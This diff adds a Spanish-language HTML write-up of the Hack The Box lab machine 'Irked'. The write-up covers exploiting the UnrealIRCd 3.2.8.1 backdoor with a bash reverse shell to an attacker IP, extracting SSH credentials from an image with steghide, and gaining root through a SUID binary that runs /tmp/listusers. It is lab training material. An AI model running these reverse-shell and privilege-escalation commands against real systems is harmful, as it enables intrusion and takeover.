@@ -1,0 +1,133 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Irked HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/linux.html">~/writeups/linux</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/irked/pasted-20260408115027.png" alt="Irked HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Linux</p>
+          <h1>Irked</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>estenografia</span>
+            <span>forense</span>
+            <span>steg</span>
+            <span>exiftool</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Servicios expuestos e identificación de UnrealIRCd</li>
+            <li><code>Explotación</code>: UnrealIRCd 3.2.8.1 vulnerable a ejecución remota de comandos</li>
+            <li><code>Movimiento lateral</code>: Esteganografía en una imagen de la web para obtener credenciales de <code>djmardov</code></li>
+            <li><code>Escalada de Privilegios</code>: Binario SUID <code>viewuser</code> ejecuta <code>/tmp/listusers</code> y permite abusar de la ruta</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/irked/pasted-20260408122209.png" alt="Irked HTB" />
+          <img class="writeup-image" src="/writeups/assets/irked/pasted-20260408122235.png" alt="Irked HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación</h2>
+          <p><a href="https://raw.githubusercontent.com/FredBrave/CVE-2010-2075-UnrealIRCd-3.2.8.1/refs/heads/main/CVE-2010-2075.py">PoC1 GitHub</a></p>
+          <p><a href="https://github.com/chancej715/UnrealIRCd-3.2.8.1-Backdoor-Command-Execution">PoC2 GitHub</a></p>
+          <div class="code-card">
+            <h3>Exploit</h3>
+            <pre><code># Listener 443
+# Exploit 1
+python3 CVE-2010-2075.py -t 10.129.17.94 -p 6697 -c 'bash -c "bash -i &gt;&amp; /dev/tcp/10.10.10.178/443 0&gt;&amp;1"'
+# Exploit 2
+python3 script.py 10.129.17.94 6697 10.10.16.178 443</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/irked/pasted-20260408123939.png" alt="Irked HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral</h2>
+          <div class="code-card">
+            <h3>Buscar en ficheros de configuración</h3>
+            <pre><code># No había ninguna contraseña en los ficheros de configuración, pero la clave del usuario del sistema estaba escondida en un fichero oculto dentro de Documents del usuario djmardov
+
+# Password Steg -&gt; UPupDOWNdownLRlrBAbaSSss
+
+# En este punto debemos de intuir que es estenografía, por lo que debemos descargar la imagen de la web para ver si tiene algún contenido oculto</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/irked/pasted-20260408134427.png" alt="Irked HTB" />
+          <img class="writeup-image" src="/writeups/assets/irked/pasted-20260408134541.png" alt="Irked HTB" />
+          <div class="code-card">
+            <h3>Aplicamos estenografía</h3>
+            <pre><code>steghide info irked.jpg
+# Password Steg -&gt; UPupDOWNdownLRlrBAbaSSss
+# Hay un archivo oculto adjunto: pass.txt</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/irked/pasted-20260408134700.png" alt="Irked HTB" />
+          <div class="code-card">
+            <h3>Extraer fichero adjunto</h3>
+            <pre><code>steghide extract -sf irked.jpg
+# Password Steg -&gt; UPupDOWNdownLRlrBAbaSSss
+# Credenciales -&gt; djmardov:Kab6h+m+bbp2J:HG</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/irked/pasted-20260408135042.png" alt="Irked HTB" />
+          <div class="code-card">
+            <h3>SSH</h3>
+            <pre><code>ssh djmardov@10.129.17.100
+# Password: Kab6h+m+bbp2J:HG</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/irked/pasted-20260408135129.png" alt="Irked HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios: SUID</h2>
+          <div class="code-card">
+            <h3>Enumerar SUID</h3>
+            <pre><code>find / -perm -4000 2&gt;/dev/null
+# SUID: /usr/bin/viewuser</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/irked/pasted-20260408142143.png" alt="Irked HTB" />
+          <div class="code-card">
+            <h3>Ejecutar binario SUID</h3>
+            <pre><code>/usr/bin/viewuser
+# Intenta ejecutar con una SH el fichero /tmp/listusers que no existe</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/irked/pasted-20260408142239.png" alt="Irked HTB" />
+          <div class="code-card">
+            <h3>Crear fichero /tmp/listusers agregando SUID a bash</h3>
+            <pre><code>#!/bin/bash
+chmod u+s /bin/bash</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Ejecutar binario</h3>
+            <pre><code>chmod +x /tmp/listusers
+/usr/bin/viewuser
+bash -p</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/irked/pasted-20260408142536.png" alt="Irked HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>estenografia</span>
+            <span>forense</span>
+            <span>steg</span>
+            <span>exiftool</span>
+            <span>IRCD</span>
+            <span>UnrealIRCD</span>
+            <span>imagen</span>
+            <span>SUID</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
